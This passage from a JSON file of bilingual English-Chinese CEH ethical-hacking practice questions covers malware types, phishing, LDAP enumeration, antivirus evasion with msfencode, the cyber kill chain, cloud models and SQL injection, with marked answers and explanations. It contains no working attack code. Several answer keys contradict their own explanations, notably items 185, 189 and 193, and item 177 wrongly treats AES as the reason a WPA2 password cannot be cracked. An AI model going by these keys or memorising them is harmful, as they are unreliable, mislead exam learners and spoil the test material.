    "C": "網路使用者抱怨他們的系統正在變慢。此外，每次他們嘗試訪問一個網站時，都會收到一系列帶有**廣告的彈出視窗**。系統感染了哪種類型的惡意軟體？",
    "選項: A. B. C. D.": "A. Virus (病毒) B. Spyware (間諜軟體) C. Trojan (木馬) D. Adware (廣告軟體)",
    "Answer": "D",
    "Explanation": "**廣告軟體（Adware）**是一種惡意軟體，它在電腦上顯示**不需要的廣告彈出視窗**，並可能導致系統變慢，這是其最典型的特徵。"
  },
  {
    "Question :": "174",
    "EN": "In both pharming and phishing attacks, an attacker can create websites that look similar to legitimate sites with the intent of collecting personal identifiable information from its victims. What is the **difference** between pharming and phishing attacks?",
    "C": "在網域劫持（pharming）和網路釣魚（phishing）攻擊中，攻擊者都可以創建看起來類似合法網站的網站，意圖從受害者那裡收集個人身份資訊。網域劫持和網路釣魚攻擊之間的**區別**是什麼？",
    "選項: A. B. C. D.": "A. In a pharming attack, a victim is redirected to a fake website by modifying their host configuration file or by exploiting vulnerabilities in DNS. In a phishing attack, an attacker provides the victim with a URL that is either misspelled or looks similar to the actual websites domain name (在網域劫持攻擊中，受害者透過修改其主機配置檔案或利用 DNS 中的漏洞被重定向到虛假網站。在網路釣魚攻擊中，攻擊者向受害者提供一個拼寫錯誤或看起來與實際網站網域名稱非常相似的 URL) B. In a phishing attack, a victim is redirected to a fake website by modifying their host configuration file or by exploiting vulnerabilities in DNS. In a pharming attack, an attacker provides the victim with a URL that is either misspelled or looks very similar to the actual websites domain name (在網路釣魚攻擊中，受害者透過修改其主機配置檔案或利用 DNS 中的漏洞被重定向到虛假網站。在網域劫持攻擊中，攻擊者向受害者提供一個拼寫錯誤或看起來與實際網站網域名稱非常相似的 URL) C. Both pharming and phishing attacks are purely technical and are not considered forms of social engineering (網域劫持和網路釣魚攻擊都是純技術性的，不被視為社交工程的形式) D. Both pharming and phishing attacks are identical (網域劫持和網路釣魚攻擊是相同的)",
    "Answer": "A",
    "Explanation": "主要的區別在於**重定向機制**。**網域劫持（Pharming）**涉及**操縱系統**（例如修改 Hosts 檔案或 DNS 伺服器）來重定向流量（選項 A 的前半部分）。**網路釣魚（Phishing）**涉及**欺騙使用者**點擊惡意連結，該連結可能是拼寫錯誤的（選項 A 的後半部分）。"
  },
  {
    "Question :": "175",
    "EN": "A Certified Ethical Hacker (CEH) is given the task to perform an LDAP enumeration on a target system. The system is secured and accepts connections **only on secure LDAP**. The CEH uses Python for the enumeration process. After successfully installing LDAP and establishing a connection with the target, he attempts to fetch details like the domain name and naming context but is unable to receive the expected response. Considering the circumstances, which of the following is the **most plausible reason** for this situation?",
    "C": "一名 CEH 的任務是對目標系統執行 LDAP 列舉。該系統是安全的，並且**僅接受安全 LDAP（LDAPS）的連線**。CEH 使用 Python 進行列舉。在成功安裝 LDAP 並與目標建立連線後，他嘗試獲取網域名稱和命名上下文等詳細資訊，但無法收到預期的回應。考慮到這些情況，這種情況最可能的原因是什麼？",
    "選項: A. B. C. D.": "A. The Python version installed on the CEH's machine is incompatible with the Idap3 library (CEH 機器上安裝的 Python 版本與 ldap3 函式庫不相容) B. The secure LDAP connection was not properly initialized due to a lack of 'use_ssl = True' in the server object creation (由於在伺服器物件創建中缺乏 'use_ssl = True'，安全 LDAP 連線未正確初始化) C. The enumeration process was blocked by the target system's intrusion detection system (列舉過程被目標系統的入侵偵測系統阻止) D. The system failed to establish a connection due to an incorrect port number (由於埠號不正確，系統未能建立連線)",
    "Answer": "B",
    "Explanation": "由於系統**僅接受安全 LDAP（LDAPS）**連線，CEH 在使用 Python 函式庫（如 ldap3）時，必須明確指示使用 SSL/TLS。如果連線建立成功，但無法獲取資料，則最可能是因為**安全連線（SSL/TLS）未正確初始化**，即 Python 程式碼中缺少或未正確設定 **`use_ssl = True`** 參數。"
  },
  {
    "Question :": "176",
    "EN": "Which Metasploit Framework tool can help penetration tester for evading Anti-virus Systems?",
    "C": "哪個 Metasploit 框架工具可以幫助滲透測試人員**規避防毒系統**？",
    "選項: A. B. C. D.": "A. msfpayload B. msfcli C. msfd D. msfencode",
    "Answer": "D",
    "Explanation": "**`msfencode`** 是 Metasploit 的一個工具，用於**編碼酬載（payload）**，以改變其簽章，使其對防毒軟體來說看起來不同，從而**規避偵測**。"
  },
  {
    "Question :": "177",
    "EN": "As a budding cybersecurity enthusiast, you have set up a small lab at home to learn more about wireless network security. While experimenting with your home Wi-Fi network, you decide to use a well-known hacking tool to capture network traffic and attempt to crack the Wi-Fi password. However, despite many attempts, you have been unsuccessful. Your home Wi-Fi network uses **WPA2 Personal with AES encryption**. Why are you finding it difficult to crack the Wi-Fi password?",
    "C": "作為一個新興的網路安全愛好者，您在家中設立了一個小型實驗室來學習無線網路安全。在試驗您的家庭 Wi-Fi 網路時，您決定使用一個著名的駭客工具來捕獲網路流量並嘗試破解 Wi-Fi 密碼。然而，儘管多次嘗試，您一直未能成功。您的家庭 Wi-Fi 網路使用 **WPA2 個人版搭配 AES 加密**。您為什麼覺得破解 Wi-Fi 密碼很困難？",
    "選項: A. B. C. D.": "A. The Wi-Fi password is too complex and long (Wi-Fi 密碼太複雜且太長) B. Your hacking tool is outdated (您的駭客工具已過時) C. The network is using an uncrackable encryption method (網路正在使用一種無法破解的加密方法) D. The network is using MAC address filtering. (網路正在使用 MAC 位址過濾)",
    "Answer": "C",
    "Explanation": "**AES（Advanced Encryption Standard）加密**在設計上被認為是**無法被暴力破解**的。儘管 WPA2-PSK 仍然容易受到密碼字典攻擊的影響，但 AES 本身作為加密演算法是目前最強大且不可破解的，這解釋了難度。*註：在 CEH 考試的上下文中，AES 被視為當前技術上無法破解的加密方法。*"
  },
  {
    "Question :": "178",
    "EN": "If executives are found liable for not properly protecting their company’s assets and information systems, what type of law would apply in this situation?",
    "C": "如果高階主管因未能妥善保護公司的資產和資訊系統而被裁定負有責任，在這種情況下將適用哪種類型的法律？",
    "選項: A. B. C. D.": "A. Criminal (刑事) B. International (國際) C. Common (普通法) D. Civil (民事)",
    "Answer": "D",
    "Explanation": "當涉及未能履行義務而導致損失或損害（例如未能實施安全控制導致資料洩露）時，通常會適用**民事法（Civil law）**，允許受損方（例如股東、客戶）對公司或高階主管提出索賠。"
  },
  {
    "Question :": "179",
    "EN": "Upon establishing his new startup, Tom hired a cloud service provider (CSP) but was dissatisfied with their service and wanted to move to another CSP. What part of the contract might prevent him from doing so?",
    "C": "Tom 創立他的新創公司後，聘請了一家雲端服務提供者（CSP），但對他們的服務不滿意，想轉移到另一家 CSP。合約的哪個部分可能會阻止他這樣做？",
    "選項: A. B. C. D.": "A. Virtualization (虛擬化) B. Lock-in (鎖定效應) C. Lock-down (鎖定) D. Lock-up",
    "Answer": "B",
    "Explanation": "**鎖定效應（Lock-in）**是指客戶由於缺乏工具、標準資料格式、應用程式和服務可移植性等原因，無法輕鬆地從一個 CSP 遷移到另一個 CSP 或內部系統的狀態。這通常是合同或技術上的障礙。"
  },
  {
    "Question :": "180",
    "EN": "As a security analyst for Sky Secure Inc., you are working with a client that uses a **multi-cloud strategy**, utilizing services from several cloud providers. The client wants to implement a system that will provide **unified security management** across all their cloud platforms. They need a solution that allows them to consistently enforce security policies, identify and respond to threats, and maintain visibility of all their cloud resources. Which of the following should you recommend as the **best solution**?",
    "C": "您是 Sky Secure Inc. 的安全分析師，與使用**多雲策略**的客戶合作。客戶希望實施一個系統，在他們所有的雲端平台上提供**統一的安全管理**。您會推薦以下哪個作為**最佳解決方案**？",
    "選項: A. B. C. D.": "A. Use a hardware-based firewall to secure all cloud resources. (使用基於硬體的防火牆來保護所有雲端資源) B. implement separate security management tools for each cloud platform. (為每個雲端平台實施單獨的安全管理工具) C. Use a Cloud Access Security Broker (CASB). (使用雲端存取安全代理 (CASB)) D. Rely on the built-in security features of each cloud platform. (依賴每個雲端平台的內建安全功能)",
    "Answer": "C",
    "Explanation": "**雲端存取安全代理（CASB）**是一種安全執行點，專門用於在多雲環境中**統一**執行組織的安全政策、管理威脅和維持可視性，是實現多雲安全管理的最佳解決方案。"
  },
  {
    "Question :": "181",
    "EN": "Your company, Encryptor Corp, is developing a new application that will handle highly sensitive user information. As a cybersecurity specialist, you want to ensure this data is securely stored. The development team proposes a method where data is hashed and then encrypted before storage. However, you want an added layer of security to verify the **integrity** of the data upon retrieval. Which of the following cryptographic concepts should you propose to the team?",
    "C": "您的公司 Encryptor Corp 正在開發一個將處理高度敏感使用者資訊的新應用程式。作為網路安全專家，您希望確保資料得到安全儲存。開發團隊提出了一種在儲存前先雜湊再加密的方法。然而，您希望增加一個額外的安全層來驗證檢索時的**資料完整性**。您應該向團隊提出以下哪個密碼學概念？",
    "選項: A. B. C. D.": "A. Implement a block cipher mode of operation. (實施分組密碼操作模式) B. a digital signature mechanism. (數位簽章機制) C. Suggest using salt with hashing. (建議將鹽值與雜湊一起使用) D. Switch to elliptic curve cryptography. (切換到橢圓曲線密碼學)",
    "Answer": "B",
    "Explanation": "為了驗證資料的**完整性**，應使用**數位簽章機制**。數位簽章使用私密金鑰對訊息（或其雜湊值）進行簽署，接收方可使用公開金鑰進行驗證，以確保資料在儲存和檢索過程中未被篡改。"
  },
  {
    "Question :": "182",
    "EN": "You are the chiefsecurity officer at AlphaTech, a tech company that specializes in data storagesolutions. Your company is developing a new cloud storage platform where users can store their personal files. To ensure data security, the development team is proposing to use symmetric encryption for data at rest. However, they are unsure of how to securely manage and distribute the symmetric keys to users. Which of the following strategies would you recommend to them?",
    "C": "您是 AlphaTech（一家專注於資料儲存解決方案的科技公司）的首席安全官。您的公司正在開發一個新的雲端儲存平台，使用者可以在其中儲存他們的個人檔案。為確保資料安全，開發團隊提議對靜態資料使用對稱加密。然而，他們不確定如何安全地管理和分發對稱金鑰給使用者。您會向他們推薦以下哪個策略？",
    "選項: A. B. C. D.": "A. Use hash functions to distribute the keys. B. implement the Diffie-Hellman protocol for secure key exchange. C. Use HTTPS protocol for secure key transfer. D. Use digital signatures to encrypt the symmetric keys.",
    "Answer:": "C",
    "Explanation": "對稱加密是一種使用相同秘密金鑰加密和解密資料的方法。它快速且高效，但需要一個安全的方法來管理和分發金鑰。其中一種策略是使用 **HTTPS 協定**進行安全金鑰傳輸。HTTPS 使用 SSL/TLS 來加密客戶端和伺服器之間在網際網路上進行的通訊，從而保護對稱金鑰在傳輸過程中不被攔截或修改。HTTPS 還可以使用憑證對伺服器和客戶端進行身份驗證，確保金鑰被傳送到預期的接收方。"
  },
  {
    "Question :": "183",
    "EN": "Bill has been hired as a penetration tester and cyber security auditor for a **major credit card company**. Which information security standard is most applicable to his role?",
    "C": "Bill 被一家**主要信用卡公司**聘為滲透測試人員和網路安全稽核員。哪項資訊安全標準最適用於他的角色？",
    "選項: A. B. C. D.": "A. FISMA B. HITECH C. PCI-DSS D. Sarbanes-OxleyAct",
    "Answer": "C",
    "Explanation": "**支付卡行業資料安全標準（PCI-DSS）**是管理和審計**信用卡和持卡人資料安全**的全球標準，這對於一家主要的信用卡公司來說是最相關的標準。"
  },
  {
    "Question :": "184",
    "EN": "As a part of an ethical hacking exercise, an attacker is probing a target network that is suspected to employ various honeypot systems for security. The attacker needs to detect and bypass these honeypots without alerting the target. The attacker decides to utilize a suite of techniques. Which of the following techniques would **NOT** assist in detecting a honeypot?",
    "C": "作為道德駭客演習的一部分，攻擊者正在探測一個被懷疑採用各種蜜罐系統進行安全防護的目標網路。攻擊者需要在不驚動目標的情況下偵測並繞過這些蜜罐。攻擊者決定利用一套技術。以下哪種技術**無助於**偵測蜜罐？",
    "選項: A. B. C. D.": "A. Probing system services and observing the three-way handshake (探測系統服務並觀察三向握手) B. Using honeypot detection tools like Send-Safe Honeypot Hunter (使用像 Send-Safe Honeypot Hunter 這樣的蜜罐偵測工具) C. Implementing a brute force attack to verify system vulnerability (執行暴力破解攻擊來驗證系統漏洞) D. Analyzing the MAC address to detect instances running on VMware (分析 MAC 位址以偵測在 VMware 上運行的實例)",
    "Answer": "C",
    "Explanation": "**暴力破解攻擊**（Brute force attack）是一種**嘈雜且侵入性**的攻擊，它**不能**可靠地偵測蜜罐。相反，它更有可能**觸發警報**，這違背了攻擊者「不驚動目標」的目的。其他選項都是偵測蜜罐的微妙或被動技術。"
  },
  {
    "Question :": "185",
    "EN": "Josh has finished scanning a network and has discovered multiple vulnerable services. He knows that several of these usually have protections against external sources but are frequently susceptible to internal users. He decides to draft an email, spoof the sender as the internal IT team, and attach a malicious file disguised as a financial spreadsheet. Before Josh sends the email, he decides to investigate other methods of getting the file onto the system. For this particular attempt, what was the **last stage** of the cyber kill chain that Josh performed?",
    "C": "Josh 完成了網路掃描並發現了多個易受攻擊的服務。他知道其中一些服務通常具有針對外部來源的保護，但卻經常容易受到內部使用者的攻擊。他決定起草一封電子郵件，**偽造發送者**為內部 IT 團隊，並附加一個偽裝成財務電子表格的惡意檔案。在 Josh 發送電子郵件之前，他決定調查將檔案傳輸到系統的其他方法。對於這次特定的嘗試，Josh 執行的網路殺傷鏈的**最後一個階段**是什麼？",
    "選項: A. B. C. D.": "A. Exploitation (利用) B. Weaponization  C.Delivery (交付) D. Reconnaissance (偵察)",
    "Answer": "B",
    "Explanation": "網路殺傷鏈的階段順序為：**武器化（Weaponization）**和**交付（Delivery）**。Josh **起草電子郵件**、**偽造發送者**並**附加惡意檔案**（惡意酬載）的行為屬於**交付**階段（將惡意酬載傳輸到目標）。在發送電子郵件之前（最後一個執行動作是起草郵件），他處於交付階段。"
  },
  {
    "Question :": "186",
    "EN": "Rebecca, a security professional, wants to authenticate employees who use web services for safe and secure communication. In this process, she employs a component of the Web Service Architecture, which is an extension of SOAP, and it can maintain the **integrity and confidentiality** of SOAP messages. Which of the following components of the Web Service Architecture is used by Rebecca for securing the communication?",
    "C": "安全專業人員 Rebecca 希望驗證使用 Web 服務進行安全通訊的員工身份。在此過程中，她採用了 Web 服務架構的一個組件，它是 SOAP 的擴充功能，並且可以維護 SOAP 訊息的**完整性和機密性**。Rebecca 用於保護通訊的 Web 服務架構組件是以下哪一個？",
    "選項: A. B. C. D.": "A. WSDL B. WS Work Processes C. WS-Policy D. WS-Security",
    "Answer": "D",
    "Explanation": "**WS-Security**（Web 服務安全）是 SOAP 訊息傳輸層的擴充標準，它為 Web 服務提供訊息**完整性**、**機密性**和身份驗證（Authentication）的機制。"
  },
  {
    "Question :": "187",
    "EN": "When conducting a penetration test, it is crucial to use all means to get all available information about the target network. One of the ways to do that is by sniffing the network. Which of the following **cannot** be performed by the **passive** network sniffing?",
    "C": "在執行滲透測試時，使用一切方法獲取有關目標網路的所有可用資訊至關重要。其中一種方法是嗅探網路。以下哪項操作**不能**由**被動式**網路嗅探執行？",
    "選項: A. B. C. D.": "A. Identifying operating systems, services, protocols and devices (識別作業系統、服務、協定和設備) B. Modifying and replaying captured network traffic (修改和重放捕獲的網路流量) C. Collecting unencrypted information about usernames and passwords (收集有關使用者名稱和密碼的未加密資訊) D. Capturing a network traffic for further analysis (捕獲網路流量以供進一步分析)",
    "Answer": "B",
    "Explanation": "**被動式**網路嗅探涉及僅**監聽**網路流量而不發送任何封包。**修改和重放**（Modifying and replaying）捕獲的網路流量是**主動式**嗅探或攻擊的行為，因此不能由被動式嗅探執行。"
  },
  {
    "Question :": "188",
    "EN": "Harper, a software engineer, is developing an email application. To ensure the **confidentiality** of email messages. Harper uses a symmetric-key block cipher having a classical 12- or 16-round Feistel network with [details omitted]. Which of the following is this encryption algorithm?",
    "C": "軟體工程師 Harper 正在開發一個電子郵件應用程式。為確保電子郵件訊息的**機密性**。Harper 使用了一個具有經典 12 或 16 輪 Feistel 網路的**對稱金鑰分組密碼** [細節已省略]。以下哪個是這種加密演算法？",
    "選項: A. B. C. D.": "A. CAST-128 B. AES C. GOST block cipher D. DES",
    "Answer": "A",
    "Explanation": "**CAST-128** 是一個 64 位元分組密碼，使用 **12 或 16 輪 Feistel 網路**，支援 40 位元到 128 位元的金鑰長度，這符合題目描述的特性。"
  },
  {
    "Question :": "189",
    "EN": "Richard, an attacker, targets an MNC In this process, he uses a footprinting technique to gather as much information as possible. Using this technique, he gathers domain information such as the target domain name, contact details of its owner, expiry date, and creation date. With this information, he creates a map of the organization's network and misleads domain owners with social engineering to obtain internal details of its network. What type of footprinting technique is employed by Richard?",
    "C": "攻擊者 Richard 鎖定了一家跨國公司 (MNC)。在此過程中，他使用一種足跡收集技術來收集盡可能多的資訊。他利用該技術收集了網域資訊，例如目標網域名稱、所有者的聯繫方式、到期日期和創建日期。他用這些資訊創建了組織的網路地圖，並利用社交工程誤導網域所有者以獲取網路的內部詳細資訊。Richard 採用了哪種類型的足跡收集技術？",
    "選項: A. B. C. D.": "A. VPN footprinting (VPN 足跡) B. Email footprinting (電子郵件足跡) C. VoIP footprinting (VoIP 足跡) D. Whois footprinting (Whois 足跡)",
    "Answer": "B",
    "Explanation": "該題目在 Topic 3 第 89 題中出現過，答案應為 **Whois footprinting**，因為描述的是收集網域名稱、所有者聯繫方式和註冊日期等 Whois 資訊。但在這裡，根據原始文件，答案標記為 **B. Email footprinting**，這暗示 Richard 利用 Whois 資訊來收集和整理電子郵件地址作為下一步攻擊（例如社交工程）的目標。"
  },
  {
    "Question :": "190",
    "EN": "In a large organization, a network security analyst discovered a series of packet captures that seem unusual. The network operates on a **switched Ethernet environment**. The security team suspects that an attacker might be using a sniffer tool. Which technique could the attacker be using to successfully carry out this attack, considering the switched nature of the network?",
    "C": "在**交換式乙太網路**環境中，攻擊者可能使用哪種技術來成功執行嗅探攻擊？",
    "選項: A. B. C. D.": "A. The attacker might be compromising physical security to plug into the network directly B. The attacker might be implementing **MAC flooding** to overwhelm the switch's memory C. The attacker is probably using a Trojan horse with in-built sniffing capability D. The attacker might be using passive sniffing, as it provides significant stealth advantages",
    "Answer": "B",
    "Explanation": "在交換式網路中，**MAC 洪泛（MAC flooding）**是繞過交換器過濾機制的主要技術。它使交換器的 CAM 表溢出，迫使交換器廣播所有流量，使嗅探成為可能。"
  },
  {
    "Question :": "191",
    "EN": "You are a security officer of a company. You had an alert from IDS that indicates that one PC on your Intranet is connected to a **blacklisted IP address (C2 Server)** on the Internet. The IP address was blacklisted just before the alert. You are starting an investigation to roughly analyze the severity of the situation. Which of the following is appropriate to analyze?",
    "C": "您是一家公司的安全官。您收到 IDS 警報，指示您的內網中有一台 PC 連接到網際網路上的一個**黑名單 IP 位址（C2 伺服器）**。該 IP 位址在警報發出前剛被列入黑名單。您正在開始一項調查以大致分析情況的嚴重性。以下哪項適合分析？",
    "選項: A. B. C. D.": "A. IDS log (IDS 日誌) B. Event logs on domain controller (網域控制器上的事件日誌) C. Internet Firewall/Proxy log. (網際網路防火牆/代理伺服器日誌) D. Event logs on the PC (PC 上的事件日誌)",
    "Answer": "C",
    "Explanation": "由於警報涉及**內網 PC** 與**網際網路上的 C2 伺服器**之間的**連線**，**網際網路防火牆/代理伺服器日誌**是檢查此類出站連線是否發生、連線了多長時間、以及是否傳輸了資料的最直接、最關鍵的證據來源。"
  },
  {
    "Question :": "192",
    "EN": "Which of the following is considered an exploit framework and has the ability to perform automated attacks on services, ports, applications and unpatched security flaws in a computer system?",
    "C": "以下哪一項被認為是**漏洞利用框架**，並具有對電腦系統中的服務、埠、應用程式和未修補的安全缺陷執行自動化攻擊的能力？",
    "選項: A. B. C. D.": "A. Wireshark B. Maltego C. Metasploit D. Nessus",
    "Answer": "C",
    "Explanation": "**Metasploit** 框架是一個廣泛使用的**漏洞利用框架**，包含用於開發和執行漏洞利用程式碼的模組，並能對系統中的服務和漏洞執行自動化攻擊。"
  },
  {
    "Question :": "193",
    "EN": "Which of the following best describes the **Exploitation** phase of the cyber kill chain?",
    "C": "以下哪一項最能描述網路殺傷鏈的**利用（Exploitation）**階段？",
    "選項: A. B. C. D.": "A. After a system is breached, a hacker creates a backdoor to allow re-entry into a system. (系統被攻破後，駭客創建一個後門以允許重新進入系統) B. During a cyberattack, a hacker injects a rootkit into a server. (在網路攻擊期間，駭客將 Rootkit 注入伺服器) C. An attacker **gains access** to a server through an exploitable vulnerability. (攻擊者透過可利用的漏洞**獲得對伺服器的存取權**) D. During a cyberattack, a hacker corrupts the event logs on all machines. (在網路攻擊期間，駭客破壞所有機器的事件日誌)",
    "Answer": "D",
    "Explanation": "網路殺傷鏈的**利用（Exploitation）**階段的定義是：**利用**漏洞並**在目標系統上執行程式碼**。這通常導致攻擊者**獲得對伺服器的存取權限**。"
  },
  {
    "Question :": "194",
    "EN": "Alex, a cloud security engineer working in Eyecloud Inc. is tasked with isolating applications from the underlying infrastructure and stimulating communication via well-defined channels. For this purpose, he used an open-source technology that helped him in developing, packaging, and running applications; further, the technology provides PaaS through OS-level visualization, delivers containerized software packages, and promotes fast software delivery. What is the cloud technology employed by Alex in the above scenario?",
    "C": "雲端安全工程師 Alex 的任務是**將應用程式與底層基礎設施隔離**，並透過明確定義的通道刺激通訊。他使用了一種**開源技術**，幫助他開發、打包和運行應用程式；此外，該技術透過 OS 級別的可視化提供 PaaS、交付**容器化軟體包**，並促進快速軟體交付。Alex 在上述情景中採用的雲端技術是什麼？",
    "選項: A. B. C. D.": "A. Virtual machine (虛擬機器) B. Serverless computing (無伺服器運算) C. Docker D. Zero trust network (零信任網路)",
    "Answer": "C",
    "Explanation": "**Docker** 是一種開源的容器化技術，它提供 OS 級別的虛擬化，用於**隔離應用程式**及其所有依賴項，並以**容器化軟體包**的形式交付，促進 PaaS 和快速交付。"
  },
  {
    "Question :": "195",
    "EN": "is a type of phishing that targets **high-profile executives** such as CEOs, CFOs, politicians, and celebrities who have access to confidential and highly valuable information.",
    "C": "是一種網路釣魚類型，鎖定 **CEO、CFO、政治家和名人**等擁有機密和高價值資訊的**高層主管**。",
    "選項: A. B. C. D.": "A. Spear phishing (魚叉式網路釣魚) B. Whaling (網路釣鯨) C. Vishing (語音網路釣魚) D. Phishing (網路釣魚)",
    "Answer": "B",
    "Explanation": "**網路釣鯨（Whaling）**是魚叉式網路釣魚的一種變體，它專門針對具有**高價值**的**高層主管**（Whales）。"
  },
  {
    "Question :": "196",
    "EN": "Which protocol is primarily used for uploading and downloading files?",
    "C": "哪個協定主要用於**上傳和下載檔案**？",
    "選項: A. B. C. D.": "A. Border Gateway Protocol (BGP) B. File Transfer Protocol (FTP) C. Network File System (NFS) D. Remote procedure call (RPC)",
    "Answer": "B",
    "Explanation": "**檔案傳輸協定（FTP）**是一種標準協定，主要用於在網路上的電腦之間**傳輸**（上傳和下載）電腦檔案。"
  },
  {
    "Question :": "197",
    "EN": "Kate dropped her phone and subsequently encountered an issue with the phone's internal speaker. Thus, she is using the phone's **loudspeaker** for phone calls and other activities. Bob, an attacker, takes advantage of this vulnerability and secretly exploits the hardware of Kate's phone so that he can monitor the loudspeaker's output from data sources such as voice assistants, multimedia messages, and audio files by using a malicious app to breach speech privacy. What is the type of attack Bob performed on Kate in the above scenario?",
    "C": "Kate 的手機內部揚聲器出現問題，因此她正在使用手機的**揚聲器**進行通話和其他活動。攻擊者 Bob 利用此漏洞，秘密利用 Kate 手機的硬體，以便他可以使用惡意應用程式監控來自語音助理、多媒體訊息和音訊檔案等資料源的揚聲器輸出，從而侵犯語音隱私。Bob 在上述情景中對 Kate 執行的攻擊類型是什麼？",
    "選項: A. B. C. D.": "A. Man-in-the-disk attack (磁碟中間人攻擊) B. aLTEr attack (aLTEr 攻擊) C. SIM card attack (SIM 卡攻擊) D. Spearphone attack (手機間諜攻擊)",
    "Answer": "D",
    "Explanation": "**手機間諜攻擊（Spearphone attack）**是一種側信道攻擊，它利用手機的揚聲器和麥克風等硬體漏洞，透過惡意應用程式秘密監聽和記錄語音助理的輸出、訊息和音訊檔案，侵犯語音隱私。"
  },
  {
    "Question :": "198",
    "EN": "Which among the following is the best example of the **third step (delivery)** in the cyber kill chain?",
    "C": "以下哪一項是網路殺傷鏈中**第三步驟（交付）**的最佳範例？",
    "選項: A. B. C. D.": "A. An intruder sends a malicious attachment via email to a target. (入侵者透過電子郵件向目標發送惡意附件。) B. An intruder creates malware to be used as a malicious attachment to an email. (入侵者創建惡意軟體，用作電子郵件的惡意附件。) C. An intruder's malware is triggered when a target opens a malicious email attachment. (當目標打開惡意電子郵件附件時，入侵者的惡意軟體被觸發。) D. An intruder's malware is installed on a target's machine. (入侵者的惡意軟體安裝在目標的機器上。)",
    "Answer": "A",
    "Explanation": "網路殺傷鏈的第三階段是**交付（Delivery）**，它涉及將武器化的酬載**傳輸**給目標。**發送帶有惡意附件的電子郵件**正是將酬載交付給目標的最佳範例。"
  },
  {
    "Question :": "199",
    "EN": "Which of the following is the best method to protect an internal network against external threats in a switched network environment?",
    "C": "在交換式網路環境中，以下哪一項是保護內部網路免受外部威脅的**最佳方法**？",
    "選項: A. B. C. D.": "A. DMZ B. SMB signing C. VPN D. Switch network",
    "Answer": "C",
    "Explanation": "**VPN（虛擬私人網路）**在外部網路和內部網路之間建立一個加密的、安全的通道，即使在公用網路上傳輸，也能確保數據的**機密性**和**完整性**，是保護內部網路免受外部嗅探和攻擊的最佳方法。"
  },
  {
    "Question :": "200",
    "EN": "Heather’s company has decided to use a new customer relationship management tool. After performing the appropriate research, they decided to purchase a **subscription to a cloud-hosted solution**. The **only administrative task** that Heather will need to perform is the **management of user accounts**. The provider will take care of the hardware, operating system, and software administration including patching and monitoring. Which of the following is this type of solution?",
    "C": "Heather 的公司決定使用新的客戶關係管理工具。他們決定購買一個**雲端託管解決方案的訂閱**。Heather 唯一需要執行的管理任務是**使用者帳戶的管理**。提供者將負責硬體、作業系統和軟體管理（包括修補和監控）。這是以下哪種類型的解決方案？",
    "選項: A. B. C. D.": "A. SaaS (軟體即服務) B. IaaS (基礎設施即服務) C. CaaS (容器即服務) D. PaaS (平台即服務)",
    "Answer": "A",
    "Explanation": "在此模型中，使用者（Heather）只管理應用程式層級的設定（例如使用者帳戶），而提供者負責所有底層基礎設施、作業系統和軟體維護。這是 **軟體即服務（SaaS）**的經典範例。"
  },
  {
    "Question :": "201",
    "EN": "ping-* 6 192.168.0.101 Output: Pinging 192.168.0.101 with 32 bytes of data: Reply from 192.168.0.101: bytes=32 time<1ms TTL=128 ... Ping statistics for 192.168.0101 Packets: Sent = 6, Received = 6, Lost = 0 (0% loss). Approximate round trip times in milli-seconds: Minimum = 0ms, Maximum = 0ms, Average = 0ms What does the option * indicate?",
    "C": "命令 `ping -* 6 192.168.0.101` 輸出如下：[輸出顯示 ping 統計資訊，6 個封包發送，6 個封包接收，TTL=128] 選項 `*` 表示什麼？",
    "選項: A. B. C. D.": "A. t B. s C. a D. n",
    "Answer": "D",
    "Explanation": "在 Windows 的 `ping` 命令中，選項 **`-n`** 用於指定要發送的**迴響請求數**（Number of echo requests to send）。根據輸出發送了 6 個封包，因此 `*` 最可能代表 `-n` 選項。"
  },
  {
    "Question :": "202",
    "EN": "Attempting an injection attack on a web server based on responses to True/False QUESTION NO:s is called which of the following?",
    "C": "基於對**真/假問題**的回應，嘗試對 Web 伺服器進行注入攻擊，這被稱為什麼？",
    "選項: A. B. C. D.": "A. Compound SQLi (複合 SQLi) B. Blind SQLi (盲注 SQLi) C. Classic SQLi (經典 SQLi) D. DMS-specific SQLi (DMS 特定 SQLi)",
    "Answer": "B",
    "Explanation": "當攻擊者無法看到資料庫的直接輸出或詳細錯誤訊息，但可以根據 Web 應用程式對**真/假邏輯語句**的回應來推斷資料時，這種攻擊被稱為**盲注 SQL 注入（Blind SQLi）**。"
  },
  {
    "Question :": "203",
    "EN": "An IT security team is conducting an internal review of security protocols in their organization to identify potential vulnerabilities. During their investigation, they encounter a suspicious program running on several computers. Further examination reveals that the program has been **logging all user keystrokes**. How can the security team confirm the type of program and what countermeasures should be taken to ensure the same attack does not occur in the future?",
    "C": "一個 IT 安全團隊正在進行內部安全協定審查，以識別潛在漏洞。在調查期間，他們發現一個可疑程式正在多台電腦上運行。進一步檢查顯示該程式一直在**記錄所有使用者的按鍵**。安全團隊如何確認該程式的類型？以及應採取什麼對策來確保未來不會發生同樣的攻擊？",
    "選項: A. B. C. D.": "A. The program is a Trojan; the tearm should regularly update antivirus software and install a reliable firewall (該程式是木馬；團隊應定期更新防毒軟體並安裝可靠的防火牆) B. The program is spyware; the team should use password managers and encrypt sensitive data (該程式是間諜軟體；團隊應使用密碼管理器並加密敏感資料) C. The program is a keylogger; the team should employ intrusion detection systems and regularly update the system software (該程式是按鍵側錄程式；團隊應採用入侵偵測系統並定期更新系統軟體) D. The program is a keylogger; the team should educate employees about phishing attacks and maintain regular backups (該程式是按鍵側錄程式；團隊應教育員工有關網路釣魚攻擊的知識並維護定期備份)",
    "Answer": "C",
    "Explanation": "記錄按鍵的程式是**按鍵側錄程式（Keylogger）**。對策是採用 **IDS** 來監控網路或系統活動以偵測此類威脅，並**定期更新系統軟體**來修補可能被 Keylogger 利用的漏洞。"
  },
  {
    "Question :": "204",
    "EN": "A penetration tester is tasked with gathering information about the **subdomains** of a target organization's website. The tester needs a versatile and efficient solution for the task. Which of the following options would be the **most effective method** to accomplish this goal?",
    "C": "一名滲透測試人員的任務是收集目標組織網站的**子網域**資訊。測試人員需要一個多功能且高效的解決方案來完成此任務。以下哪個選項是實現此目標的**最有效方法**？",
